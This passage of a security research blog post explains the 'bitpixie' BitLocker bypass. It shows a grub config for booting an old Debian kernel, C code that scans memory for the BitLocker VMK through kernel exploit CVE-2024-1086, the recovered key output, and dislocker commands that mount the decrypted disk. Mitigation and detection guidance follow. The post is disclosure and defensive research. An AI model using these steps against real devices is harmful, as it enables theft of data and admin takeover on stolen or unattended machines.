Lockdown is pretty solid, and known bypasses get patched.
None of the lockdown bypasses or raw memory reads I could find (e.g., broken drivers, ACPI tables, some random DMA things) worked anymore.
Kernel modules must be signed to be loaded, so that isn’t an option either.</p>
<p>What to do?
Easy!
<strong>Let’s exploit a Linux kernel in this Windows bootmanager exploit</strong> :D
Luckily, nowhere in the Linux boot chain does it say we have to boot up-to-date software (<em>cough</em> SBAT <em>cough</em>, more on that later!).
So we ran another “downgrade”, and looked for some old kernel with known vulnerabilities.</p>
<p>What Kernel should we pick?
We needed one that still boots on the latest shim/grub, which means signed after the distro last rotated their signing keys.
Also, we have to make sure to get the shim, the grub, and the kernel, all from the same distro.
Since Ubuntu somewhat recently rotated their Secure Boot keys (<a href="https://blog.jak-linux.org/2023/02/01/ubuntu-key-rotation/">Ubuntu 2022v1 Secure Boot key rotation and friends</a>), their old kernels will no longer boot, so I went with Debian.
They have great archives from which we can pick a suitable version.
I selected an up-to-date shim and grub, and used the arbitrarily selected kernel 5.14:</p>
<ul>
<li><a href="https://packages.debian.org/buster/shim-signed">Signed shim</a></li>
<li><a href="https://packages.debian.org/buster/grub-efi-amd64-signed">Signed grub</a></li>
<li><a href="https://snapshot.debian.org/package/linux-signed-amd64/5.14.6%2B2/#linux-image-5.14.0-1-amd64_5.14.6-2">Signed kernel</a></li>
</ul>
<p><strong>Next Problem: Booting old Kernel with modules</strong>:
Getting shim and grub to run is straightforward — just drop them into the TFTP folder.
Booting the kernel isn’t hard as well, but the initial filesystem, either <code>initrd</code> or <code>initramfs</code>, is a bit tricky.
Taking any random old initial filesystem works, but we run into issues with kernel modules, because the kernel is still in lockdown mode and enforces module signature checks.
Yay. We need matching initrd and kernel.</p>
<p>Finding a prebuilt old netboot kernel/initrd combination proved a dead end. There might be the perfect secure-bootable netboot out there, but I didn’t find it. This which left me with no choice but to build my own initrd based on the selected kernel and kernel-modules.
<em>Note</em>: If your exploit doesn’t require any external kernel modules, you might get away without this step, and can just use a random <code>initrd</code>.</p>
<p>The first tool I found was an Alpine-based initrd builder: <a href="https://github.com/lsiudut/alpine-initrd/tree/master">alpine-initrd</a>.
Alpine is not Debian, you say? No matter, I unpacked my botching tools and got to work!
The correct kernel modules, with matching versions and signatures, were already part of the Debian kernel <code>.deb</code> file I had downloaded earlier.
I modified the dockerfile to copy the correct kernel modules. To actually get them to load, <code>depmod -a</code> is your friend.
Could this process have been more elegant?
Absolutely.
But it was built incrementally without hindsight, and it <em>works surprisingly well</em>!
The Linux Kernel has a stable userspace ABI after all.</p>
<p>With the <code>initrd</code> in place, the last step was configuring grub to boot it.
This required creating a simple <code>grub.cfg</code> file in the <code>$TFTP/grub</code> folder, alongside the kernel and <code>initrd</code> in the TFTP root directory:</p>
<pre tabindex="0"><code><span><span>menu entry &#34;Debian 5.14 with Alpine Initramfs&#34; {</span></span>
<span><span> set gfxpayload=keep</span></span>
<span><span> linux   debian-kernel-514</span></span>
<span><span> initrd  alpine-initrd.xz</span></span>
<span><span>}</span></span></code></pre>
<h3 id="step-3b-exploiting-the-linux-kernel">Step 3b: Exploiting the Linux Kernel<a aria-hidden="true" tabindex="-1" href="#step-3b-exploiting-the-linux-kernel"><span>¶</span></a></h3>
<p>We have now successfully PXE-booted into Debian 5.14 on Secure Boot.
Now came another fun part: exploiting the kernel to read raw memory.
I used a vulnerability in Debian 5.14, <a href="https://nvd.nist.gov/vuln/detail/cve-2024-1086">CVE-2024-1086</a>.
Why this one?
Honestly, pretty random. A colleague suggested it because it has a public PoC by <a href="https://github.com/Notselwyn/CVE-2024-1086">Notselwyn</a>, and it worked well for this purpose.
Feel free to pick your favourite vulnerability.
The exploit I used takes advantage of a primitive that maps page tables into userspace, making raw memory scanning easy.
Because of this, I didn’t even bother disabling or bypassing lockdown mode, I could scan for the VMK straight from the exploit.</p>
<p>Scanning for the VMK in memory was straightforward thanks to a nice 8-byte magic header: <code>-FVE-FS-</code>.
This header is part of a data structure containing the VMK.
There are multiple structures with this header. To find the correct one, I used QEMU.
First, I used <code>dislocker</code> to dump the expected VMK (knowing the recovery key).
Then, I used QEMU to dump memory.
Finally, I compared the known-good VMK against the memory dump across multiple boots.</p>
<p>The structure was always really similar:
The structure always started with <code>-FVE-FS</code>.
The “version” field at offset 4 was always <code>1</code>.
The VMK’s exact offset within the struct varied depending on OS version, but I found that the 4 bytes immediately preceding the VMK were always the same: <code>03 20 01 00</code>.
Using this pattern, I built a reliable VMK scanner that works across all Windows 10 and 11 versions I tested:</p>
<pre tabindex="0"><code><span><span>// Haystack search for the needle. We have &#39;redirected&#39; the pmd_data_area to point to physical memory with our PTE override above:</span></span>
<span><span>//printf(&#34;[+] haystack.\n&#34;);</span></span>
<span><span>void*</span><span> pmd_vmk_hdr_addr </span><span>=</span><span> memmem</span><span>(pmd_data_area, </span><span>0x</span><span>200000</span><span>, </span><span>&#34;-FVE-FS-&#34;</span><span>, </span><span>8</span><span>);</span></span>
<span><span>if</span><span> (pmd_vmk_hdr_addr </span><span>==</span><span> NULL</span><span>)</span></span>
<span><span>    continue</span><span>;</span></span>
<span></span>
<span><span>unsigned</span><span> long</span><span> long</span><span> phys_vmk_hdr_addr </span><span>=</span><span> phys_base </span><span>+</span><span> (pmd_vmk_hdr_addr </span><span>-</span><span> pmd_data_area);</span></span>
<span></span>
<span><span>// We have found a potential VMK! hexdump the area around it!</span></span>
<span><span>printf</span><span>(</span><span>&#34;[+] found possible VMK base: </span><span>%p</span><span> -&gt; </span><span>%016llx\n</span><span>&#34;</span><span>, pmd_vmk_hdr_addr, phys_vmk_hdr_addr);</span></span>
<span><span>hexDump</span><span>(</span><span>&#34;VMK Candidate&#34;</span><span>, pmd_vmk_hdr_addr, </span><span>0x</span><span>10</span><span>*</span><span>40</span><span>, </span><span>0x</span><span>10</span><span>);</span></span>
<span></span>
<span><span>uint32_t</span><span> version </span><span>=</span><span> *</span><span>(</span><span>uint32_t*</span><span>)(pmd_vmk_hdr_addr </span><span>+</span><span> 8</span><span>+</span><span>4</span><span>);</span><span> // version</span></span>
<span><span>uint32_t</span><span> start </span><span>=</span><span> *</span><span>(</span><span>uint32_t*</span><span>)(pmd_vmk_hdr_addr </span><span>+</span><span> 8</span><span>+</span><span>4</span><span>+</span><span>4</span><span>);</span><span> // start</span></span>
<span><span>uint32_t</span><span> end </span><span>=</span><span> *</span><span>(</span><span>uint32_t*</span><span>)(pmd_vmk_hdr_addr </span><span>+</span><span> 8</span><span>+</span><span>4</span><span>+</span><span>4</span><span>+</span><span>4</span><span>);</span><span> // end</span></span>
<span><span>if</span><span> (version </span><span>!=</span><span> 1</span><span>) {</span></span>
<span><span>    printf</span><span>(</span><span>&#34;[+] VERSION MISMATCH! </span><span>%d\n</span><span>&#34;</span><span>, version);</span></span>
<span><span>    continue</span><span>;</span></span>
<span><span>}</span></span>
<span><span>if</span><span> (end </span><span>&lt;=</span><span> start) {</span></span>
<span><span>    printf</span><span>(</span><span>&#34;[+] NOT ENOUGH SIZE! </span><span>%x</span><span>, </span><span>%x\n</span><span>&#34;</span><span>, start, end);</span></span>
<span><span>    continue</span><span>;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>// Now we found the correct VMK struct, look for more bytes that signal start of VMK</span></span>
<span><span>// No idea what they actually represent, just bindiffed win10/11 struct in memory and found them to be constant here.</span></span>
<span><span>void*</span><span> pmd_vmk_addr </span><span>=</span><span> memmem</span><span>(pmd_vmk_hdr_addr, end, </span><span>&#34;</span><span>\x03\x20\x01\x00</span><span>&#34;</span><span>, </span><span>4</span><span>);</span></span>
<span><span>if</span><span> (pmd_vmk_hdr_addr </span><span>==</span><span> NULL</span><span>) {</span></span>
<span><span>    printf</span><span>(</span><span>&#34;[+] VMK-needle not found!</span><span>\n</span><span>&#34;</span><span>);</span></span>
<span><span>    continue</span><span>;</span></span>
<span><span>}</span></span>
<span></span>
<span><span>char*</span><span> vmk </span><span>=</span><span> pmd_vmk_addr </span><span>+</span><span> 4</span><span>;</span></span>
<span><span>printf</span><span>(</span><span>&#34;[+] found VMK at: </span><span>%p</span><span> \n</span><span>&#34;</span><span>, vmk);</span></span>
<span><span>/// [...]</span></span>
<span><span>fwrite</span><span>(vmk, </span><span>sizeof</span><span>(</span><span>char</span><span>), </span><span>32</span><span>, file);</span></span></code></pre>
<p>In practice, I never encountered a case where Linux overwrote the VMK in memory.
While I’m not certain this behavior is guaranteed, I’m not complaining! :)</p>
<p>Note that there are many other ways to achieve the same goal.
For example, we could have booted into a second Windows installation and loaded a vulnerable kernel driver there.
However, I was more familiar with Linux, so this method was the most practical for me.</p>
<p>Running the exploit, we get:</p>
<pre tabindex="0"><code><span><span>[...]</span></span>
<span><span>VMK Candidate:</span></span>
<span><span>  0000  2d 46 56 45 2d 46 53 2d 00 40 00 00 01 00 00 00  -FVE-FS-.@......</span></span>
<span><span>  0010  20 00 00 00 b0 00 00 00 00 00 00 00 00 00 00 00   ...............</span></span>
<span><span>  0020  90 00 00 00 01 00 00 00 30 00 00 00 90 00 00 00  ........0.......</span></span>
<span><span>  0030  61 e8 6f 18 a5 40 83 47 82 11 84 b4 85 8e 12 2f  a.o..@.G......./</span></span>
<span><span>  0040  13 00 00 00 04 80 00 00 76 46 2d 5c e0 b5 da 01  ........vF-\....</span></span>
<span><span>  0050  2c 00 05 00 01 00 01 00 03 20 01 00 4a 50 39 47  ,........ ..JP9G</span></span>
<span><span>  0060  d7 0d aa ea 23 44 d1 d4 fc aa 9c a4 e4 10 ae e7  ....#D..........</span></span>
<span><span>  0070  0a 5e a4 96 b3 68 82 72 b6 90 09 4a 08 00 04 00  .^...h.r...J....</span></span>
<span><span>  0080  07 00 01 00 2c 00 09 00 01 00 01 00 05 20 00 00  ....,........ ..</span></span>
<span><span>  0090  a7 b5 99 e7 bf 12 e1 81 0f ab f0 b0 f6 b8 8a 8c  ................</span></span>
<span><span>  00a0  a7 c7 b5 6a f8 b8 c3 6a 0b a4 7e 88 fd 6a 9f 8b  ...j...j..~..j..</span></span>
<span><span>  00b0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span>  00c0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span>  00d0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span>  00e0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span>  00f0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span></span>
<span><span></span></span>
<span><span>VMK = 4a 50 39 47 d7 0d aa ea 23 44 d1 d4 fc aa 9c a4 e4 10 ae e7 0a 5e a4 96 b3 68 82 72 b6 90 09 4a</span></span></code></pre>
<h3 id="step-4-mounting-the-bitlocker-paritition-with-vmk">Step 4: Mounting the BitLocker Paritition With VMK<a aria-hidden="true" tabindex="-1" href="#step-4-mounting-the-bitlocker-paritition-with-vmk"><span>¶</span></a></h3>
<p>Finally, we’ve arrived!
With the VMK in hand, mounting the BitLocker partition should be straightforward, right?
Well, almost… Windows doesn’t expect you to have the decrypted VMK at hand, and there is no official tooling using it from CLI.</p>
<p>On Linux, there are (at least) two tools for mounting BitLocker disks: <code>dislocker</code> and <code>cryptsetup</code>.</p>
<p><code>dislocker</code> is great, as it directly accepts the VMK from CLI. It decrypts the BitLocker volume and provides access to its contents.
Unfortunately, it breaks when handling partitions created on Windows 11 24H2 right now: <a href="https://github.com/Aorimn/dislocker/issues/334">dislocker/issues/334</a>. This issue prevents the tool from parsing the disk and even attempting decryption.</p>
<p>The other tool, <code>cryptsetup</code> does not have this restriction, and works with 24H2 disks. But it has it’s own small caveat — it only accepts the FVEK, not the VMK from CLI.
But a minor patch to <code>cryptsetup</code> enables it to accept VMKs directly.</p>
<p>Here’s how you’d typically use dislocker given a VMK:</p>
<pre tabindex="0"><code><span><span>modprobe</span><span> fuse</span></span>
<span><span>mkdir</span><span> bitlocker</span></span>
<span><span>dislocker</span><span> -V</span><span> $PARTITION </span><span>-K</span><span> vmk.dat</span><span> -vvv</span><span> --</span><span> bitlocker</span></span>
<span><span>mkdir</span><span> mnt</span></span>
<span><span>mount</span><span> -t</span><span> ntfs-3g</span><span> -o</span><span> loop</span><span> bitlocker/dislocker-file</span><span> mnt</span></span></code></pre>
<p>We have full read and write access to the BitLocker partition. This means not only can we dump any stored secrets, we can for example also add a new admin-user. We can then boot the device without the exploit, and have full admin rights on the device.</p>
<h2 id="affected-devices">Affected Devices<a aria-hidden="true" tabindex="-1" href="#affected-devices"><span>¶</span></a></h2>
<p>During my talk, I demonstrated this bug live on a Lenovo P14s Gen 2 laptop.
However, it is pretty much applicable to all devices using the default BitLocker “Device Encryption” setup, as this configuration relies solely on Secure Boot to automatically unseal the disk during boot.
Notably, Microsoft recently enabled exactly this default configuration on <em>all</em> Windows 11 24H2 devices that are signed into a Microsoft account.
This is great to see!
Bring disk encryption to everyone!
However, there’s still a long way to go before it’s actually secure by default.</p>
<p>To exploit bitpixie, an attacker needs:</p>
<ul>
<li>physical access to the device,</li>
<li>access to a keyboard and a network port (for network booting) or a USB port to connect an external LAN adapter,</li>
<li>network boot (PXEBoot) enabled or a way to enable it.</li>
</ul>
<p>If someone steals a device, this is easily fulfilled!
As far as I am concerned, this vulnerability affects <strong>all Secure Boot-protected BitLocker partitions on all versions of Windows</strong>, except for those having taken manual steps to mitigate this, or those running <em>exactly</em> July 2024 security update and no newer update (what a weird thing to say, right? Read on to find out why :p)</p>
<p>To check if your concrete setup is vulnerable, check what protectors your BitLocker partition has.
You can do this in Powershell with <code>manage-bde -protectors -get c:</code>.
This prints something along the lines of:</p>
<pre tabindex="0"><code><span><span>&gt; manage-bde -protectors -get c:</span></span>
<span><span></span></span>
<span><span>Volume C: []</span></span>
<span><span>All Key Protectors</span></span>
<span><span>[...]</span></span>
<span><span> TPM:</span></span>
<span><span> ID: {85825FF8-3733-48D0-B0EE-4D32D8AAFD7A}</span></span>
<span><span> PCR Validation Profile:</span></span>
<span><span> 7, 11</span></span>
<span><span> (Uses Secure Boot for integrity validation)</span></span></code></pre>
<p>Then, check the PCR Validation Profile.
If it shows <em>exactly</em> <code>7, 11</code> you are vulnerable.
If it includes a 4, you aren’t affected.</p>
<p>Optionally, check that you don’t have <a href="https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines">KB5025885</a> applied, which prevents this downgrade attack from working. Only systems using a bootloader signed with the 2011 Secure Boot certificate are vulnerable, which is the default.
To check this, mount your boot partition and check the signature of <code>S:\EFI\Microsoft\Boot\bootmgfw.efi</code>, as shown in Step 2d in <a href="https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines">KB5025885</a>.</p>
<h2 id="mitigation">Mitigation<a aria-hidden="true" tabindex="-1" href="#mitigation"><span>¶</span></a></h2>
<p>As you might expect, Microsoft is well aware of this vulnerability.
Unfortunately, there is no “easy and perfect” fix for this bug, which is why Microsoft hasn’t fixed this from their end.
They’ve attempted to rollout fixes before, most recently for <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38058">CVE-2024-38058</a>, which has a similar impact to the bug exploited here.
Unfortunately, their fix caused compatibility issues, forcing them to roll back the update within a month.</p>
<p>Downgrade protection in Secure Boot was really more of an afterthought, though that is slowly changing right now.
Here are your mitigation options, each with its own trade-offs.
Most aren’t available on Windows Home, which only gets the basic “Device Encryption” feature. Full BitLocker functionality requires a Pro/Enterprise license.</p>
<p>Worried about your own encryption, and this is all way too complicated?
As a first step, stop relying on automatic unsealing, and set a pre-boot password. That makes you an order of maginude more secure:</p>
<p><strong>Option 1: pre-boot authentication</strong>
In my opinion, this is the most secure “easy” solution available.
Enabling pre-boot authentication requires users to enter a password before the system boots.
In this mode, the TPM provides brute-force protection, and the attacker would have to either know the password or break the TPM.
However, this option introduces a minor inconvenience, as every user must authenticate at boot.</p>
<div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M13 9h-2V7h2m0 10h-2v-6h2m-1-9A10 10 0 0 0 2 12a10 10 0 0 0 10 10a10 10 0 0 0 10-10A10 10 0 0 0 12 2Z"></path></svg><p>If you have a discrete TPM (dTPM) on your motherboard, a secure pre-boot PIN is the only way to protect against <a href="https://www.youtube.com/watch?v=wTl4vEednkQ">hardware-based bus-sniffing attacks</a>, since TPM parameter encryption isn’t enabled yet for BitLocker keys.</p></div>
<p><strong>Option 2: adjust PCR configuration</strong>
This bug relies on a bootloader downgrade, and the fact that all secure-bootable Microsoft bootloaders can unlock the disk in the default configuration. Preventing bootloader downgrades, and always keeping it up-to-date thus protects you from known bootloader vulnerabilities.
You can do this by using a BitLocker PCR configuration of 0/2/4/11 instead of 7/11, sometimes called “legacy configuration”, since it doesn’t rely on Secure Boot.
However, there are two main trade-offs:
(1) This still leaves you vulnerable to unknown bootloader 0-days.
(2) You may experience more frequent BitLocker recovery screens (e.g., after UEFI or bootloader updates), where the automated disk unlocking fails.
This heavily depends on your exact setup but is one of the reasons Microsoft has changed its default to Secure Boot.</p>
<p><strong>Option 3: apply KB5025885</strong>
Microsoft’s official guidance now suggests users manually apply <a href="https://support.microsoft.com/en-us/topic/kb5025885-how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d#bkmk_mitigation_guidelines">KB5025885</a>.
But be warned, this is fairly involved, as it adds new Secure Boot certificates, replaces your bootloader, and revokes old certificates.
While this is Microsoft’s planned long-term fix, it’s a complex process and isn’t fully rolled out yet.
For preventing this attack, steps 1 and 2 (using a bootloader signed by the 2023 certificate) are sufficient.
Blacklisting the 2011 certificate isn’t strictly necessary for this specific vulnerability:
The downgrade would still work, but the TPM would refuse to unseal the key, since the Secure Boot certificate differs.</p>
<p><strong>What doesn’t work</strong>:
Removing the PXE boot option from your UEFI isn’t enough.
Many UEFIs automatically add PXE-capable USB network cards, even if they weren’t previously enabled.
They have the lowest priority, but if we manually select this from the Windows recovery environment, this doesn’t matter.
Disabling the networking stack altogether could help, but attackers might still reset the UEFI to re-enable it, even if password protected.
Also, this isn’t the only attack vector for exploiting downgraded boot managers.
<a href="https://github.com/Wack0/bitlocker-attacks">Other techniques</a> can bypass these measures without relying on PXE.</p>
<p>Blocking the Microsoft 3rd-party Secure Boot certificate doesn’t help either. It would prevent Linux from booting, but that would only block the presented exploitation strategy, not the issue itself. It is also exploitable using any vulnerable Windows driver, of which there are enough. Note: This is default on Lenovo P14s Gen3 and newer as most Lenovo devices are now secured core PCs! See <a href="https://download.lenovo.com/pccbbs/mobiles_pdf/Enable_Secure_Boot_for_Linux_Secured-core_PCs.pdf">Lenovo Secured-core
PC’s</a>.</p>
<div><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M13 9h-2V7h2m0 10h-2v-6h2m-1-9A10 10 0 0 0 2 12a10 10 0 0 0 10 10a10 10 0 0 0 10-10A10 10 0 0 0 12 2Z"></path></svg><p>You can find more information about the security trade-offs in the Microsoft documentation on <a href="https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/countermeasures">BitLocker countermeasures</a>. While I disagree with their claim that the default Secure Boot-based TPM config is sufficient against attacks <em>“without much skill or with limited physical access”</em>, their recommendations are otherwise comprehensive and worth exploring. They go a lot deeper than the basic mitigations presented here.</p></div>
<h2 id="conclusion">Conclusion<a aria-hidden="true" tabindex="-1" href="#conclusion"><span>¶</span></a></h2>
<p>Phew, this was quite involved for such a “simple” idea.
But in the end, we get full read/write access to a BitLocker encrypted disk on the default “Device Encryption” BitLocker setup, without any changes to the target system!</p>
<p>The necessary downgrade of the bootloader is fairly easy to perform, but Secure Boot made the exploit more involved than expected, even though it was bypassable at every step.
To summarize:</p>
<ol>
<li>We got an old Windows bootmanager that was vulnerable to the pxesoftreboot bug</li>
<li>We copied the BCD from the target device</li>
<li>We modified the BCD to have a pxesoftreboot recovery option</li>
<li>We pointed that recovery option to a Debian shim</li>
<li>We triggered a PXE boot on the target device into our downgraded Windows boot manager. This unsealed the VMK, the boot failed and caused a fallback to our pxesoftreboot, which booted Debian shim, which in return booted a Debian grub</li>
<li>We set grub to boot an old Debian 5.14 kernel with an Alpine <code>initrd</code></li>
<li>We exploited the kernel with a known bug to read raw memory</li>
<li>We extracted the VMK</li>
<li>We used dislocker to mount the partition</li>
<li>We can read/write the decrypted Windows partition</li>
</ol>
<p>So is BitLocker Device Encryption a bad idea? Certainly not. Default hard-drive encryption for home users is a big step forward — any protection is better than none, and it makes “wiping” drives during factory resets straightforward. And once Microsoft rolls out a persistent fix to the downgrade issue, this new default setup will be a lot more secure. There will likely still be attacks against TPM-only setups, but more difficult ones.
But <em>right now</em>, without those patches rolled out, it can give a false sense of security.</p>
<p>There’s no widely available exploit tool for this method, and we certainly won’t be publishing one.
That said, it seems reasonable to assume that well-resourced parties already have access to such exploits.</p>
<p><strong>Why is this still possible?</strong>
Can’t we patch the downgrades somehow?
Since this post is already quite extensive, I split it up into a companion post: <a href="https://neodyme.io/en/blog/bitlocker_why_no_fix">On Secure Boot, TPMs, SBAT and Downgrades — Why Microsoft hasn’t fixed BitLocker yet</a>.
If your are at all interested in secure/verified boot, how this exactly combined to create automated unlocks, and why Linux users have been prompted with obscure SBAT errors in the past couple months, I recommend you check it out! It also contains a section on ‘Other attacks against BitLocker’, that shows just how many different vectors there are against TPM-only unlocks.</p>
<p>Please use this research responsibly!
Should you have any questions, please reach out to thomas (at) neodyme.io, maybe I can help :)</p>
<h2 id="38c3-talk---windows-bitlocker--screwed-without-a-screwdriver">38C3 Talk - Windows BitLocker — Screwed without a Screwdriver<a aria-hidden="true" tabindex="-1" href="#38c3-talk---windows-bitlocker--screwed-without-a-screwdriver"><span>¶</span></a></h2>
<p>I presented this research at <a href="https://events.ccc.de/congress/2024/infos/index.html">38C3</a>.
You can find the presentation here: <a href="https://media.ccc.de/v/38c3-windows-bitlocker-screwed-without-a-screwdriver">https://media.ccc.de/v/38c3-windows-bitlocker-screwed-without-a-screwdriver</a></p>
<gdpr-embed content="https://media.ccc.de/v/38c3-windows-bitlocker-screwed-without-a-screwdriver/oembed" props="allowfullscreen frameborder=0"><div><p>By revealing the content you are aware that third-parties may collect personal information</p></div></gdpr-embed>
<h2 id="some-notes-on-debugging-with-qemu">Some Notes on Debugging with QEMU<a aria-hidden="true" tabindex="-1" href="#some-notes-on-debugging-with-qemu"><span>¶</span></a></h2>
<p>I tested all of this in QEMU before running it on real hardware.
This was great, since I could dump memory whenever I wanted. But the initial setup was annoying.
Here’s what worked for me:</p>
<ul>
<li>Use QEMU with <code>libvirt/virt-manager</code></li>
<li>Windows 11 24H2 as the guest OS:
<ul>
<li>This version greatly simplifies BitLocker activation, automatically enabling it as long as Secure Noot is on and the user is logged into a Microsoft account.</li>
</ul>
</li>
<li>Configure QEMU for Secure Boot:
<ul>
<li>The default OVMF variables (EFI configuration) do not include any certificates, so you need to manually enroll Microsoft’s Secure Boot certificates: <code>ovmfctl --input /usr/share/edk2-ovmf/x64/OVMF_VARS.4m.fd --secure-boot --distro-keys windows --output file.fd</code></li>
<li>Enable TPM 2.0</li>
</ul>
</li>
<li>Set up PXE boot:
<ul>
<li>edit a bridge network to include the <code>tftp</code> and <code>bootp</code> options in the XML configuration.</li>
</ul>
</li>
<li>Dump memory with <code>virsh</code>:
<ul>
<li>Use <code>sudo virsh dump --memory-only win-test /tmp/mem.dmp</code>.</li>
<li>Analyse the dump with tools like <a href="https://github.com/breppo/Volatility-BitLocker">Volatility-Bitlocker</a> to extract the FVEK (careful: not the VMK!)</li>
</ul>
</li>
</ul>
<p>You can get the VMK by entering the recovery-password in <code>dislocker</code> with verbose output, which then prints the VMK to the console.
Then, you can search the memory dump for the known VMK.</p>
<pre tabindex="0"><code><span><span>sudo qemu-nbd --connect=/dev/nbd2 win.qcow2</span></span>
<span><span>sudo dislocker -vvvv -V /dev/nbd0p3 -p</span></span></code></pre>
<p>A final note: specifying the FVEK directly in <code>dislocker</code> can be tricky, as outlined in <a href="https://github.com/Aorimn/dislocker/issues/202">dislocker/issues/202</a>.</p> </div></div>
  </body>
</html>
